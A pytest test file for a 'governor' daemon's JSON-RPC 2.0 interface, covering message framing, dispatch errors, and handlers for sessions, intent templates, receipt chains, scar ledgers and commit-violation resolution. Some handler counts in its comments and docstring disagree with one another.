# SPDX-License-Identifier: Apache-2.0
"""Tests for the governor daemon — protocol, dispatcher, all 26 handlers."""

import asyncio
import json
import os
import tempfile
from pathlib import Path
from typing import Any
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from governor.daemon import (
    AUTH_ERROR,
    GOVERNOR_ERROR,
    INVALID_PARAMS,
    INVALID_REQUEST,
    METHOD_NOT_FOUND,
    PARSE_ERROR,
    PROTOCOL_VERSION,
    DaemonState,
    Dispatcher,
    _emit_chat_receipt,
    default_socket_path,
    detect_backend,
    load_daemon_config,
    read_message,
    register_handlers,
    write_message,
)


# =============================================================================
# Helpers
# =============================================================================


def frame(msg: dict) -> bytes:
    """Create a Content-Length framed message."""
    body = json.dumps(msg).encode("utf-8")
    return f"Content-Length: {len(body)}\r\n\r\n".encode("utf-8") + body


def rpc_request(method: str, params: dict | None = None, id: int = 1) -> dict:
    """Build a JSON-RPC 2.0 request."""
    req = {"jsonrpc": "2.0", "method": method, "id": id}
    if params is not None:
        req["params"] = params
    return req


def rpc_notification(method: str, params: dict | None = None) -> dict:
    """Build a JSON-RPC 2.0 notification (no id)."""
    req = {"jsonrpc": "2.0", "method": method}
    if params is not None:
        req["params"] = params
    return req


async def roundtrip(dispatcher: Dispatcher, method: str,
                    params: dict | None = None, id: int = 1) -> dict:
    """Send a request through the dispatcher and return the response."""
    request = rpc_request(method, params, id)
    return await dispatcher.dispatch(request)


@pytest.fixture
def tmp_gov_dir(tmp_path):
    """Create a temporary governor directory with minimal structure."""
    gov_dir = tmp_path / ".governor"
    gov_dir.mkdir()
    (gov_dir / "sessions").mkdir()
    (gov_dir / "sessions" / "index.json").write_text(
        json.dumps({"sessions": {}, "mainline": None})
    )
    return gov_dir


@pytest.fixture
def state(tmp_gov_dir):
    """Create a DaemonState with temporary governor directory."""
    return DaemonState(tmp_gov_dir, mode="general")


@pytest.fixture
def dispatcher_and_state(state):
    """Create a Dispatcher with all handlers registered."""
    d = Dispatcher()
    register_handlers(d, state)
    return d, state


# =============================================================================
# Protocol: Content-Length framing
# =============================================================================


class TestContentLengthFraming:
    """Test Content-Length framed message reading/writing."""

    @pytest.mark.asyncio
    async def test_read_message_basic(self):
        """Read a simple JSON-RPC message."""
        msg = {"jsonrpc": "2.0", "method": "test", "id": 1}
        data = frame(msg)
        reader = asyncio.StreamReader()
        reader.feed_data(data)
        result = await read_message(reader)
        assert result == msg

    @pytest.mark.asyncio
    async def test_read_message_eof(self):
        """Return None on EOF."""
        reader = asyncio.StreamReader()
        reader.feed_eof()
        result = await read_message(reader)
        assert result is None

    @pytest.mark.asyncio
    async def test_read_message_no_content_length(self):
        """Return None when no Content-Length header."""
        reader = asyncio.StreamReader()
        reader.feed_data(b"X-Custom: foo\r\n\r\n{}")
        reader.feed_eof()
        result = await read_message(reader)
        assert result is None

    @pytest.mark.asyncio
    async def test_write_message(self):
        """Write a framed message and verify format."""
        msg = {"jsonrpc": "2.0", "id": 1, "result": {"ok": True}}
        writer = MagicMock()

        async def mock_drain():
            pass

        writer.drain = mock_drain
        written_data = bytearray()
        writer.write = lambda data: written_data.extend(data)

        await write_message(writer, msg)

        output = written_data.decode("utf-8")
        assert output.startswith("Content-Length: ")
        assert "\r\n\r\n" in output

        # Parse back
        _, _, body = output.partition("\r\n\r\n")
        parsed = json.loads(body)
        assert parsed == msg

    @pytest.mark.asyncio
    async def test_read_multiple_messages(self):
        """Read two consecutive framed messages."""
        msg1 = {"jsonrpc": "2.0", "method": "a", "id": 1}
        msg2 = {"jsonrpc": "2.0", "method": "b", "id": 2}
        reader = asyncio.StreamReader()
        reader.feed_data(frame(msg1) + frame(msg2))
        reader.feed_eof()

        r1 = await read_message(reader)
        r2 = await read_message(reader)
        assert r1 == msg1
        assert r2 == msg2

    @pytest.mark.asyncio
    async def test_read_message_with_unicode(self):
        """Handle unicode content correctly."""
        msg = {"jsonrpc": "2.0", "method": "test", "id": 1, "params": {"text": "caf\u00e9"}}
        data = frame(msg)
        reader = asyncio.StreamReader()
        reader.feed_data(data)
        result = await read_message(reader)
        assert result["params"]["text"] == "caf\u00e9"


# =============================================================================
# Dispatcher: JSON-RPC 2.0 protocol
# =============================================================================


class TestDispatcher:
    """Test JSON-RPC 2.0 dispatcher logic."""

    @pytest.mark.asyncio
    async def test_dispatch_valid_request(self):
        async def echo(p):
            return p

        d = Dispatcher()
        d.register("echo", echo)
        resp = await d.dispatch(rpc_request("echo", {"hello": "world"}))
        assert resp["jsonrpc"] == "2.0"
        assert resp["id"] == 1
        assert resp["result"] == {"hello": "world"}

    @pytest.mark.asyncio
    async def test_dispatch_method_not_found(self):
        d = Dispatcher()
        resp = await d.dispatch(rpc_request("nonexistent"))
        assert resp["error"]["code"] == METHOD_NOT_FOUND
        assert "nonexistent" in resp["error"]["message"]

    @pytest.mark.asyncio
    async def test_dispatch_invalid_jsonrpc_version(self):
        d = Dispatcher()
        resp = await d.dispatch({"jsonrpc": "1.0", "method": "x", "id": 1})
        assert resp["error"]["code"] == INVALID_REQUEST

    @pytest.mark.asyncio
    async def test_dispatch_missing_method(self):
        d = Dispatcher()
        resp = await d.dispatch({"jsonrpc": "2.0", "id": 1})
        assert resp["error"]["code"] == INVALID_REQUEST

    @pytest.mark.asyncio
    async def test_dispatch_not_dict(self):
        d = Dispatcher()
        resp = await d.dispatch("not a dict")
        assert resp["error"]["code"] == PARSE_ERROR

    @pytest.mark.asyncio
    async def test_dispatch_handler_raises(self):
        async def bad_handler(params):
            raise RuntimeError("boom")

        d = Dispatcher()
        d.register("fail", bad_handler)
        resp = await d.dispatch(rpc_request("fail"))
        assert resp["error"]["code"] == GOVERNOR_ERROR
        assert "boom" in resp["error"]["message"]

    @pytest.mark.asyncio
    async def test_dispatch_handler_type_error(self):
        async def typed_handler(params):
            raise TypeError("bad param type")

        d = Dispatcher()
        d.register("typed", typed_handler)
        resp = await d.dispatch(rpc_request("typed"))
        assert resp["error"]["code"] == INVALID_PARAMS

    @pytest.mark.asyncio
    async def test_dispatch_notification_no_response(self):
        called = []
        async def handler(params):
            called.append(True)
            return {"ok": True}

        d = Dispatcher()
        d.register("notify_me", handler)
        resp = await d.dispatch(rpc_notification("notify_me"))
        assert resp is None
        assert called == [True]

    @pytest.mark.asyncio
    async def test_dispatch_notification_method_not_found(self):
        d = Dispatcher()
        resp = await d.dispatch(rpc_notification("nope"))
        assert resp is None  # Notifications don't get error responses

    @pytest.mark.asyncio
    async def test_dispatch_notification_handler_error(self):
        async def fail(params):
            raise RuntimeError("oops")
        d = Dispatcher()
        d.register("fail", fail)
        resp = await d.dispatch(rpc_notification("fail"))
        assert resp is None

    @pytest.mark.asyncio
    async def test_dispatch_preserves_id(self):
        async def echo(p):
            return {}

        d = Dispatcher()
        d.register("echo", echo)
        resp = await d.dispatch(rpc_request("echo", id=42))
        assert resp["id"] == 42

    @pytest.mark.asyncio
    async def test_dispatch_string_id(self):
        async def echo(p):
            return {}

        d = Dispatcher()
        d.register("echo", echo)
        req = {"jsonrpc": "2.0", "method": "echo", "id": "abc-123", "params": {}}
        resp = await d.dispatch(req)
        assert resp["id"] == "abc-123"

    @pytest.mark.asyncio
    async def test_dispatch_null_id(self):
        async def echo(p):
            return {}

        d = Dispatcher()
        d.register("echo", echo)
        req = {"jsonrpc": "2.0", "method": "echo", "id": None, "params": {}}
        resp = await d.dispatch(req)
        assert resp["id"] is None
        assert "result" in resp

    @pytest.mark.asyncio
    async def test_dispatch_non_dict_params(self):
        """Non-dict params should be coerced to empty dict."""
        async def echo(p):
            return p

        d = Dispatcher()
        d.register("echo", echo)
        req = {"jsonrpc": "2.0", "method": "echo", "id": 1, "params": [1, 2, 3]}
        resp = await d.dispatch(req)
        assert resp["result"] == {}


# =============================================================================
# DaemonState
# =============================================================================


class TestDaemonState:
    """Test lazy initialization of governor subsystems."""

    def test_init(self, tmp_gov_dir):
        state = DaemonState(tmp_gov_dir, mode="fiction")
        assert state.governor_dir == tmp_gov_dir
        assert state.mode == "fiction"
        assert state.root == tmp_gov_dir.parent

    def test_session_store_lazy(self, state):
        assert state._session_store is None
        store = state.session_store
        assert store is not None
        assert state.session_store is store  # Same instance

    def test_receipt_system_lazy(self, state):
        assert state._receipt_system is None
        sys = state.receipt_system
        assert sys is not None
        assert state.receipt_system is sys

    def test_scar_ledger_lazy_no_file(self, state):
        """When no scars.json, create empty ledger."""
        assert state._scar_ledger is None
        ledger = state.scar_ledger
        assert ledger is not None
        assert len(ledger.get_active_scars()) == 0

    def test_scar_ledger_lazy_with_file(self, tmp_gov_dir):
        """When scars.json exists, load from it."""
        from governor.scars import ScarLedger, Scar
        ledger = ScarLedger()
        ledger.record_failure("test_region", observation_shift=0.1,
                              prediction_error=0.3, description="test")
        scar_path = tmp_gov_dir / "scars.json"
        scar_path.write_text(json.dumps(ledger.to_dict()))

        state = DaemonState(tmp_gov_dir)
        loaded = state.scar_ledger
        assert loaded.total_failures == 1

    def test_violation_resolver_lazy(self, state):
        assert state._violation_resolver is None
        resolver = state.violation_resolver
        assert resolver is not None
        assert state.violation_resolver is resolver


# =============================================================================
# Handler: governor.hello
# =============================================================================


class TestGovernorHello:

    @pytest.mark.asyncio
    async def test_hello_returns_protocol_version(self, dispatcher_and_state):
        d, state = dispatcher_and_state
        resp = await roundtrip(d, "governor.hello")
        result = resp["result"]
        assert result["protocol_version"] == PROTOCOL_VERSION

    @pytest.mark.asyncio
    async def test_hello_capabilities(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "governor.hello")
        caps = resp["result"]["capabilities"]
        assert caps["fix_mode"] == "candidate_only"
        assert caps["sessions"] is True
        assert caps["intent"] is True

    @pytest.mark.asyncio
    async def test_hello_governor_info(self, dispatcher_and_state):
        d, state = dispatcher_and_state
        resp = await roundtrip(d, "governor.hello")
        gov = resp["result"]["governor"]
        assert gov["mode"] == "general"
        assert gov["initialized"] is True  # tmp_gov_dir exists


# =============================================================================
# Handler: governor.now
# =============================================================================


class TestGovernorNow:

    @pytest.mark.asyncio
    async def test_now_returns_pill_and_sentence(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "governor.now")
        result = resp["result"]
        assert "pill" in result
        assert "sentence" in result

    @pytest.mark.asyncio
    async def test_now_graceful_on_missing_state(self, tmp_path):
        """When governor dir is empty, still returns something."""
        gov_dir = tmp_path / ".governor"
        gov_dir.mkdir()
        state = DaemonState(gov_dir)
        d = Dispatcher()
        register_handlers(d, state)
        resp = await roundtrip(d, "governor.now")
        assert "pill" in resp["result"]


# =============================================================================
# Handler: governor.status
# =============================================================================


class TestGovernorStatus:

    @pytest.mark.asyncio
    async def test_status_fields(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "governor.status")
        result = resp["result"]
        assert "mode" in result
        assert result["mode"] == "general"


# =============================================================================
# Handler: sessions.*
# =============================================================================


class TestSessions:

    @pytest.mark.asyncio
    async def test_list_empty(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "sessions.list")
        assert resp["result"] == []

    @pytest.mark.asyncio
    async def test_create_and_list(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        # Create
        resp = await roundtrip(d, "sessions.create", {"title": "Test Session"})
        assert "metadata" in resp["result"]
        session_id = resp["result"]["metadata"]["session_id"]

        # List
        resp = await roundtrip(d, "sessions.list", id=2)
        assert len(resp["result"]) == 1

    @pytest.mark.asyncio
    async def test_get_session(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        # Create first
        resp = await roundtrip(d, "sessions.create", {"title": "Fetch Me"})
        session_id = resp["result"]["metadata"]["session_id"]

        # Get
        resp = await roundtrip(d, "sessions.get", {"id": session_id}, id=2)
        assert resp["result"]["metadata"]["name"] == "Fetch Me"

    @pytest.mark.asyncio
    async def test_get_nonexistent_session(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "sessions.get", {"id": "nonexistent"})
        assert resp["result"] is None

    @pytest.mark.asyncio
    async def test_delete_session(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        # Create
        resp = await roundtrip(d, "sessions.create", {"title": "Delete Me"})
        session_id = resp["result"]["metadata"]["session_id"]

        # Delete
        resp = await roundtrip(d, "sessions.delete", {"id": session_id}, id=2)
        assert resp["result"]["success"] is True

        # Verify gone
        resp = await roundtrip(d, "sessions.list", id=3)
        assert len(resp["result"]) == 0

    @pytest.mark.asyncio
    async def test_delete_missing_id(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "sessions.delete", {})
        assert resp["error"]["code"] == GOVERNOR_ERROR

    @pytest.mark.asyncio
    async def test_get_missing_id(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "sessions.get", {})
        assert resp["error"]["code"] == GOVERNOR_ERROR


# =============================================================================
# Handler: intent.*
# =============================================================================


class TestIntent:

    @pytest.mark.asyncio
    async def test_templates(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "intent.templates")
        result = resp["result"]
        assert "templates" in result
        names = [t["name"] for t in result["templates"]]
        assert "session_start" in names

    @pytest.mark.asyncio
    async def test_schema(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "intent.schema", {"template_name": "session_start"})
        result = resp["result"]
        assert "schema_id" in result
        assert result["template_name"] == "session_start"
        assert "fields" in result

    @pytest.mark.asyncio
    async def test_schema_missing_template(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "intent.schema", {})
        assert resp["error"]["code"] == GOVERNOR_ERROR

    @pytest.mark.asyncio
    async def test_policy(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "intent.policy")
        result = resp["result"]
        assert result["mode"] == "general"
        assert "policy" in result

    @pytest.mark.asyncio
    async def test_validate_with_values(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        # Get schema first
        schema_resp = await roundtrip(d, "intent.schema",
                                       {"template_name": "session_start"})
        schema_id = schema_resp["result"]["schema_id"]

        # Validate (empty values should produce errors for required fields)
        resp = await roundtrip(d, "intent.validate",
                               {"schema_id": schema_id, "values": {},
                                "template_name": "session_start"}, id=2)
        result = resp["result"]
        assert "valid" in result
        assert "errors" in result

    @pytest.mark.asyncio
    async def test_compile(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        # Get schema
        schema_resp = await roundtrip(d, "intent.schema",
                                       {"template_name": "session_start"})
        schema = schema_resp["result"]

        # Build values from defaults
        values = {}
        for field in schema.get("fields", []):
            if field.get("default") is not None:
                values[field["field_id"]] = field["default"]
            elif field.get("options"):
                values[field["field_id"]] = field["options"][0]["value"]

        resp = await roundtrip(d, "intent.compile",
                               {"schema_id": schema["schema_id"],
                                "values": values,
                                "template_name": "session_start"}, id=2)
        result = resp["result"]
        assert "intent_profile" in result
        assert "receipt_hash" in result


# =============================================================================
# Handler: receipts.*
# =============================================================================


class TestReceipts:

    @pytest.mark.asyncio
    async def test_list_empty(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "receipts.list")
        assert resp["result"] == []

    @pytest.mark.asyncio
    async def test_list_with_receipt(self, dispatcher_and_state):
        d, state = dispatcher_and_state
        # Emit a receipt directly
        state.receipt_system.emit(
            gate="test_gate",
            verdict="pass",
            subject_kind="test",
            subject_bytes=b"test content",
            evidence_bundle={"data": "test"},
            gate_config={"threshold": 0.5},
        )
        resp = await roundtrip(d, "receipts.list")
        assert len(resp["result"]) == 1
        assert resp["result"][0]["gate"] == "test_gate"

    @pytest.mark.asyncio
    async def test_list_with_filter(self, dispatcher_and_state):
        d, state = dispatcher_and_state
        state.receipt_system.emit(
            gate="a", verdict="pass", subject_kind="t",
            subject_bytes=b"1", evidence_bundle={}, gate_config={},
        )
        state.receipt_system.emit(
            gate="b", verdict="block", subject_kind="t",
            subject_bytes=b"2", evidence_bundle={}, gate_config={},
        )

        resp = await roundtrip(d, "receipts.list", {"verdict": "block"})
        assert len(resp["result"]) == 1
        assert resp["result"][0]["gate"] == "b"

    @pytest.mark.asyncio
    async def test_detail(self, dispatcher_and_state):
        d, state = dispatcher_and_state
        receipt = state.receipt_system.emit(
            gate="test", verdict="pass", subject_kind="t",
            subject_bytes=b"x", evidence_bundle={"key": "val"}, gate_config={},
        )
        resp = await roundtrip(d, "receipts.detail",
                               {"receipt_id": receipt.receipt_id})
        assert resp["result"]["receipt"]["receipt_id"] == receipt.receipt_id
        assert resp["result"]["evidence"] is not None

    @pytest.mark.asyncio
    async def test_detail_not_found(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "receipts.detail", {"receipt_id": "nonexistent"})
        assert resp["error"]["code"] == GOVERNOR_ERROR

    @pytest.mark.asyncio
    async def test_detail_missing_id(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "receipts.detail", {})
        assert resp["error"]["code"] == GOVERNOR_ERROR


# =============================================================================
# Handler: receipts_v1.* (new Receipt v1 format, separate from legacy)
# =============================================================================


def _write_receipt_v1(gov_dir: Path, session_id: str = "s1", count: int = 1):
    """Write Receipt v1 records to the standard path."""
    from receipt_v1 import (
        Action, Actor, AuthContext, Provenance,
        ReceiptBuilder, ReceiptChain,
    )
    from receipt_v1.sinks import FileSink

    path = gov_dir / "receipts" / "receipt_v1.jsonl"
    path.parent.mkdir(parents=True, exist_ok=True)
    sink = FileSink(path, fsync=False)
    chain = ReceiptChain()
    receipts = []
    for i in range(count):
        r = (
            ReceiptBuilder()
            .actor(Actor(agent_id="test", session_id=session_id,
                         auth_context=AuthContext.STDIO))
            .tool("echo", {"text": f"msg-{i}"}, call_id=str(i + 1))
            .decision(Action.ALLOW, "gov.policy_allow")
            .provenance(Provenance(
                deployment_id="test", instance_id="test-1",
                governor_version="0.1.0"))
            .build(chain.next())
        )
        chain.append(r)
        sink.write(r)
        receipts.append(r)
    return receipts


class TestReceiptsV1:

    @pytest.mark.asyncio
    async def test_list_empty(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "receipts_v1.list")
        assert resp["result"] == []

    @pytest.mark.asyncio
    async def test_list_with_receipts(self, dispatcher_and_state):
        d, state = dispatcher_and_state
        written = _write_receipt_v1(state.governor_dir, count=3)
        resp = await roundtrip(d, "receipts_v1.list")
        assert len(resp["result"]) == 3
        # Newest first
        assert resp["result"][0]["chain"]["seq"] == 3

    @pytest.mark.asyncio
    async def test_list_with_limit(self, dispatcher_and_state):
        d, state = dispatcher_and_state
        _write_receipt_v1(state.governor_dir, count=5)
        resp = await roundtrip(d, "receipts_v1.list", {"limit": 2})
        assert len(resp["result"]) == 2

    @pytest.mark.asyncio
    async def test_list_filter_session(self, dispatcher_and_state):
        d, state = dispatcher_and_state
        _write_receipt_v1(state.governor_dir, session_id="sess-a", count=2)
        # Write more with different session (separate chain)
        from receipt_v1 import (
            Action, Actor, AuthContext, Provenance,
            ReceiptBuilder, ReceiptChain,
        )
        from receipt_v1.sinks import FileSink
        path = state.governor_dir / "receipts" / "receipt_v1.jsonl"
        chain = ReceiptChain()
        # Advance past the 2 already written (they have seq 1,2 in their chain)
        # These are independent — just appending to same file
        for i in range(2):
            r = (
                ReceiptBuilder()
                .actor(Actor(agent_id="test", session_id="sess-b",
                             auth_context=AuthContext.STDIO))
                .tool("echo", {"text": f"b-{i}"}, call_id=str(i + 10))
                .decision(Action.ALLOW, "gov.policy_allow")
                .provenance(Provenance(
                    deployment_id="test", instance_id="test-1",
                    governor_version="0.1.0"))
                .build(chain.next())
            )
            chain.append(r)
            FileSink(path, fsync=False).write(r)

        resp = await roundtrip(d, "receipts_v1.list", {"session_id": "sess-a"})
        assert len(resp["result"]) == 2
        assert all(r["actor"]["session_id"] == "sess-a" for r in resp["result"])

    @pytest.mark.asyncio
    async def test_detail(self, dispatcher_and_state):
        d, state = dispatcher_and_state
        written = _write_receipt_v1(state.governor_dir, count=1)
        rid = written[0].receipt_id
        resp = await roundtrip(d, "receipts_v1.detail", {"receipt_id": rid})
        assert resp["result"]["receipt"]["receipt_id"] == rid

    @pytest.mark.asyncio
    async def test_detail_not_found(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "receipts_v1.detail",
                               {"receipt_id": "nonexistent"})
        assert resp["error"]["code"] == GOVERNOR_ERROR

    @pytest.mark.asyncio
    async def test_detail_missing_id(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "receipts_v1.detail", {})
        assert resp["error"]["code"] == GOVERNOR_ERROR

    @pytest.mark.asyncio
    async def test_verify_valid_chain(self, dispatcher_and_state):
        d, state = dispatcher_and_state
        written = _write_receipt_v1(state.governor_dir, count=4)
        resp = await roundtrip(d, "receipts_v1.verify")
        result = resp["result"]
        assert result["valid"] is True
        assert result["errors"] == []
        # Chain metadata
        assert result["count"] == 4
        assert result["first_receipt_id"] == written[0].receipt_id
        assert result["last_receipt_id"] == written[-1].receipt_id
        assert result["gaps"] == []

    @pytest.mark.asyncio
    async def test_verify_empty_chain(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "receipts_v1.verify")
        result = resp["result"]
        assert result["valid"] is True
        assert result["count"] == 0
        assert result["first_receipt_id"] is None
        assert result["last_receipt_id"] is None
        assert result["gaps"] == []

    @pytest.mark.asyncio
    async def test_endpoints_independent_from_legacy(self, dispatcher_and_state):
        """receipts_v1.* and receipts.* are completely independent."""
        d, state = dispatcher_and_state
        # Write legacy receipt
        state.receipt_system.emit(
            gate="test_gate", verdict="pass", subject_kind="test",
            subject_bytes=b"test", evidence_bundle={}, gate_config={},
        )
        # Write v1 receipt
        _write_receipt_v1(state.governor_dir, count=1)

        legacy = await roundtrip(d, "receipts.list")
        v1 = await roundtrip(d, "receipts_v1.list")

        # Each sees only its own
        assert len(legacy["result"]) == 1
        assert legacy["result"][0]["gate"] == "test_gate"
        assert len(v1["result"]) == 1
        assert "chain" in v1["result"][0]  # Receipt v1 structure


# =============================================================================
# Handler: scars.*
# =============================================================================


class TestScars:

    @pytest.mark.asyncio
    async def test_list_empty(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "scars.list")
        result = resp["result"]
        assert "scars" in result
        assert "shields" in result
        assert "stats" in result
        assert result["scars"] == []

    @pytest.mark.asyncio
    async def test_list_with_scars(self, tmp_gov_dir):
        from governor.scars import ScarLedger
        ledger = ScarLedger()
        # Low surprise ratio (obs/pred < rho_lo) → INTERNAL → scar
        ledger.record_failure("src/bad.py", observation_shift=0.1,
                              prediction_error=1.0, description="test failure")
        (tmp_gov_dir / "scars.json").write_text(json.dumps(ledger.to_dict()))

        state = DaemonState(tmp_gov_dir)
        d = Dispatcher()
        register_handlers(d, state)

        resp = await roundtrip(d, "scars.list")
        assert len(resp["result"]["scars"]) >= 1

    @pytest.mark.asyncio
    async def test_history_empty(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "scars.history")
        assert resp["result"] == []

    @pytest.mark.asyncio
    async def test_history_with_events(self, tmp_gov_dir):
        from governor.scars import ScarLedger
        ledger = ScarLedger()
        ledger.record_failure("r1", description="first")
        ledger.record_failure("r2", description="second")
        (tmp_gov_dir / "scars.json").write_text(json.dumps(ledger.to_dict()))

        state = DaemonState(tmp_gov_dir)
        d = Dispatcher()
        register_handlers(d, state)

        resp = await roundtrip(d, "scars.history", {"limit": 1})
        assert len(resp["result"]) == 1

    @pytest.mark.asyncio
    async def test_history_with_limit(self, tmp_gov_dir):
        from governor.scars import ScarLedger
        ledger = ScarLedger()
        for i in range(10):
            ledger.record_failure(f"r{i}", description=f"fail {i}")
        (tmp_gov_dir / "scars.json").write_text(json.dumps(ledger.to_dict()))

        state = DaemonState(tmp_gov_dir)
        d = Dispatcher()
        register_handlers(d, state)

        resp = await roundtrip(d, "scars.history", {"limit": 3})
        assert len(resp["result"]) == 3


# =============================================================================
# Handler: commit.*
# =============================================================================


class TestCommit:

    @pytest.mark.asyncio
    async def test_pending_none(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "commit.pending")
        assert resp["result"] is None

    @pytest.mark.asyncio
    async def test_fix_no_pending(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "commit.fix", {"corrected_text": "hello"})
        assert resp["result"]["success"] is False
        assert "No pending" in resp["result"]["message"]

    @pytest.mark.asyncio
    async def test_fix_missing_text(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "commit.fix", {})
        assert resp["error"]["code"] == GOVERNOR_ERROR

    @pytest.mark.asyncio
    async def test_revise_no_pending(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "commit.revise")
        assert resp["result"]["success"] is False

    @pytest.mark.asyncio
    async def test_proceed_no_pending(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "commit.proceed", {"reason": "testing"})
        assert resp["result"]["success"] is False

    @pytest.mark.asyncio
    async def test_exceptions_empty(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "commit.exceptions")
        assert resp["result"] == []

    @pytest.mark.asyncio
    async def test_pending_with_violation(self, dispatcher_and_state):
        """Create a pending violation and verify it's returned."""
        d, state = dispatcher_and_state
        resolver = state.violation_resolver

        # Create a pending violation manually
        resolver.create_pending(
            violations=[{"anchor_id": "a1", "description": "test violation"}],
            blocked_response="bad response",
            run_id="run_1",
        )

        resp = await roundtrip(d, "commit.pending")
        result = resp["result"]
        assert result is not None
        assert result["blocked_response"] == "bad response"

    @pytest.mark.asyncio
    async def test_proceed_with_violation(self, dispatcher_and_state):
        d, state = dispatcher_and_state
        resolver = state.violation_resolver

        resolver.create_pending(
            violations=[{"anchor_id": "a1", "description": "test"}],
            blocked_response="bad",
            run_id="run_1",
        )

        resp = await roundtrip(d, "commit.proceed", {"reason": "needed"})
        result = resp["result"]
        assert result["success"] is True
        assert result["action"] == "proceed"

        # Should now have an exception
        resp = await roundtrip(d, "commit.exceptions", id=2)
        assert len(resp["result"]) == 1

    @pytest.mark.asyncio
    async def test_revise_with_violation(self, dispatcher_and_state):
        d, state = dispatcher_and_state
        resolver = state.violation_resolver

        resolver.create_pending(
            violations=[{"anchor_id": "a1", "description": "test"}],
            blocked_response="original",
            run_id="run_1",
        )

        resp = await roundtrip(d, "commit.revise", {"new_anchor_text": "updated"})
        result = resp["result"]
        assert result["success"] is True
        assert result["action"] == "revise"


# =============================================================================
# default_socket_path
# =============================================================================


class TestDefaultSocketPath:

    def test_uses_xdg_runtime_dir(self, tmp_path):
        with patch.dict(os.environ, {"XDG_RUNTIME_DIR": str(tmp_path)}):
            gov_dir = Path("/home/user/project/.governor")
            path = default_socket_path(gov_dir)
            assert str(path).startswith(str(tmp_path))
            assert path.name.startswith("governor-")
            assert path.suffix == ".sock"

    def test_deterministic(self, tmp_path):
        with patch.dict(os.environ, {"XDG_RUNTIME_DIR": str(tmp_path)}):
            gov_dir = Path("/home/user/project/.governor")
            p1 = default_socket_path(gov_dir)
            p2 = default_socket_path(gov_dir)
            assert p1 == p2

    def test_different_dirs_different_paths(self, tmp_path):
        with patch.dict(os.environ, {"XDG_RUNTIME_DIR": str(tmp_path)}):
            p1 = default_socket_path(Path("/a/.governor"))
            p2 = default_socket_path(Path("/b/.governor"))
            assert p1 != p2

    def test_fallback_to_tmp(self):
        env = os.environ.copy()
        env.pop("XDG_RUNTIME_DIR", None)
        with patch.dict(os.environ, env, clear=True):
            path = default_socket_path(Path("/project/.governor"))
            assert str(path).startswith("/tmp")


# =============================================================================
# All 21 methods registered
# =============================================================================


class TestAllMethodsRegistered:

    EXPECTED_METHODS = [
        "governor.hello",
        "governor.now",
        "governor.status",
        "governor.methods",
        "governor.selfcheck",
        "sessions.list",
        "sessions.create",
        "sessions.delete",
        "sessions.get",
        "intent.templates",
        "intent.schema",
        "intent.validate",
        "intent.compile",
        "intent.policy",
        "receipts.list",
        "receipts.detail",
        "scars.list",
        "scars.history",
        "commit.pending",
        "commit.fix",
        "commit.revise",
        "commit.proceed",
        "commit.exceptions",
        "chat.send",
        "chat.models",
        "chat.backend",
        "correlator.status",
        "correlator.history",
        "correlator.kvector",
        "scope.status",
        "scope.check",
        "scope.escalate",
        "scope.grants",
        "stability.status",
        "stability.audit",
        "stability.history",
        "stability.probe",
        "lanes.route",
        "lanes.explain",
        "lanes.status",
        "claims.list",
        "claims.detail",
        "claims.for_receipt",
        "claims.window",
        "claims.stats",
        "policy.evaluate",
        "policy.info",
        "policy.capabilities",
        "chain.evaluate",
        "chain.preflight",
        "chain.record",
        "chain.status",
        "chain.rules",
        "chain.reset",
        "signals.query",
        "signals.get",
        "signals.tail",
        "signals.stats",
    ]

    EXPECTED_STREAMING_METHODS = [
        "chat.stream",
    ]

    def test_all_registered(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        for method in self.EXPECTED_METHODS:
            assert method in d._handlers, f"Missing handler: {method}"
        for method in self.EXPECTED_STREAMING_METHODS:
            assert method in d._streaming_handlers, f"Missing streaming handler: {method}"

    def test_rpc_method_count(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        total = len(d._handlers) + len(d._streaming_handlers)
        assert total == 64

    @pytest.mark.asyncio
    async def test_all_methods_callable(self, dispatcher_and_state):
        """Every registered method should return a response (not crash)."""
        d, _ = dispatcher_and_state
        for i, method in enumerate(self.EXPECTED_METHODS):
            resp = await d.dispatch(rpc_request(method, {}, id=i))
            # Should get either a result or a governor error (missing params etc)
            # but NOT a method-not-found or parse error
